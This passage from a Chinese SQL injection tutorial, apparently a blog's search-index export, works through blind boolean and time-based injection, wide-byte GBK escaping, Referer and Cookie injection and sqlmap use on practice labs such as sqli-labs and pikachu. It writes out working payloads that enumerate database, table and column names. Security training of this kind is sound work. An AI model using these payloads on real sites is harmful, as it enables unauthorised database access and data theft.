src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/33.png"></p><p>依次爆破后面的字符</p></blockquote><p>方法五：</p><blockquote><p>用ascii()函数和substr()函数、Burp suite抓包，两变量一起爆破</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/34.png"></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/35.png"></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/36.png"></p><p>爆破结果：</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/37.png"></p></blockquote><p><strong>二、猜表名</strong></p><p>先猜表名的字段数</p><p>下面再猜字符</p><p><code>payload: and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;106</code></p><blockquote><p>方法同上面的猜数据库名，就是select 语句有所改变</p></blockquote><p><strong>三、猜表的字段</strong></p><p><code>payload: and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=‘loflag’ limit 0,1),1,1))&gt;1</code></p><blockquote><p>方法同上，select语句改变</p></blockquote><h5 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h5><p>时间型的注入遇到的条件更为苛刻，数据交互完成以后目标网站<strong>没有错误和正确的页面回显</strong>，这种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行。</p><p>常用函数：</p><blockquote><p>sleep(seconds)：将程序挂起一段时间为n秒</p><p>if(expr1,expr2,expr3)：判断语句，如果第一个语句正确，就执行第二个语句；如果错误执行，就执行第三个语句</p></blockquote><p><strong>实验（sqli-labs&#x2F;less-9):</strong></p><blockquote><p>一、枚举当前数据库名：</p><p>获取数据库名的长度</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/38.png"></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/40.png"></p><p>依次获取每个字符</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/41.png"></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/42.png"></p><p>依次枚举后面的字符，可得数据库名为”security”</p><p>二、猜表名</p><p><code>payload: and if (ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;100,1,sleep(5)) %23</code></p><p>此时立即回显；</p><p><code>payload: and if (ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;101,1,sleep(5)) %23</code></p><p>此时缓冲5秒后回显</p><p>即表名为‘email’</p><p>三、猜表里的字段</p><p><code>payload:and if (ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;email&#39; limit 0,1),1,1))&gt;104,1,sleep(5)) %23</code></p><p>此时立即回显</p><p><code>payload:and if (ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;email&#39; limit 0,1),1,1))&gt;105,1,sleep(5)) %23</code></p><p>此时缓冲5秒后回显</p><p>字段为‘id’</p></blockquote><h4 id="特殊注入"><a href="#特殊注入" class="headerlink" title="特殊注入"></a>特殊注入</h4><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>在mysql中，用于转义（即在字符串中的符号前加上“&#x2F;“）的函数有addslashes,mysql_real_escape_string,mysql_escape_string等</p><p>宽字节：GB2312、GBK、GB18030、BIG5、Shift——JIS等是常见的宽字节，实际上只有两个字节。</p><p>宽字符带来的安全问题主要是吃ASCII字符（一字节）的现象，将两个ascii字符误认为是一个宽字节字符</p><p><strong>宽字节注入原理</strong></p><p>１.字符型的注入点通过单引号来判断，当遇上addslashes()时，单引号会被转义成<code>\&#39;</code>,导致判断注入点失效，我们用来判断注入点的单引号失效。</p><p>2.URL编码</p><p><code>空格:  %20</code></p><p><code>&#39; :   %27</code></p><p><code># :   %23</code> </p><p><code>\ :   %5C</code></p><p>3.<code>payload: %df &#39;</code>,原理是当MYSQL在使用GBK编码的时候，会认为两个字符是一个繁体汉字，让单引号%27成功逃逸：</p><p> <code>’  —&gt;  \&#39; —&gt;  %5C%27</code>   </p><p><code>%df &#39;  —&gt;  %df\&#39;  —&gt; %df%5C%27</code></p><p><strong>实验（pikachu)：</strong></p><blockquote><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/43.png"></p><p>为POST型注入，用burp suite抓包</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/44.png"></p><p>可显字段</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/45.png"></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/46.png"></p><p>由上面的两个图可以知道，字段为2</p><p>获取数据库名</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/47.png"></p><p>下面同上面，只需改变select语句</p></blockquote><h5 id="HTTP-Referer注入"><a href="#HTTP-Referer注入" class="headerlink" title="HTTP-Referer注入"></a>HTTP-Referer注入</h5><p><a href="https://www.cnblogs.com/guizimo/p/13710243.html">Referer的含义解释</a></p><blockquote><p>实验（sqli-labs&#x2F;less-19)：</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/48.png"></p><p><code>insert语句：insert into xxx(列名，列名，列名) values (&#39;&#39;,&#39;&#39;)</code>        xxx为表名</p><p>根据insert设计成功回显<code>insert into xxx(列名，列名，列名) values (&#39;&#39; and &#39;&#39;,&#39;&#39;)</code>就不报错了</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/49.png"></p><p>加入报错语句extractvalue(),获取数据库信息</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/50.png"></p><p>或者是</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/51.png"></p><p>将1换成报错语句updatexml(),获取数据库信息</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/52.png"></p></blockquote><h5 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h5><p>Cookie注入简单来说就是利用Cookie而发起的注入攻击。从本质上来讲，Cookie注入与传统的SQL注入并无不同，两者都是针对数据库的注入，只是表现形式上略有不同罢了。</p><p><strong>cookie注入原理</strong>：对get传递来的参数进行了过滤，但是忽略了cookie也可以传递参数。</p><blockquote><p>实验（CTFHub-cookie注入）：</p><p>方法一：</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/53.png" alt="53"></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/54.png"></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/55.png"></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/56.png"></p><p>方法二（自动化注入）：</p><p><a href="https://www.cnblogs.com/php09/p/10404560.html">sqlmap的使用</a></p></blockquote><h5 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h5><p>含义：“伪静态”顾名思义就是一种表面上看似是静态网页（以.html、.htm等结尾），不存在任何的数据交互，却其实是动态网页，存在数据交互的网站，具有这种特性的网页成为“伪静态网页”。我们看到的伪静态网页其实是经过处理的，将动态网页的id等参数通过URL重写来隐藏，让查看者以为是静态网页。</p><p>如果看到一个以.html或者.htm结尾的网页，此时可以通过在地址输入框中输入：<code>javascript:alert(document.lastModified)</code>，来得到网页最后的修改时间，如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态；因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。<br>网上的一个伪静态网站</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/57.png"></p><p>用sqlmap自动化注入攻击</p><p><code>sqlmap -u http://xxx.xx.xx.xx:xx/test.php/id/1.html   --database()</code></p><p>其余获取数据库信息只需换一下后面的语句</p><h5 id="Base64变形注入"><a href="#Base64变形注入" class="headerlink" title="Base64变形注入"></a>Base64变形注入</h5><p>将order by 等等语句进行base64加密，再进行注入</p>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
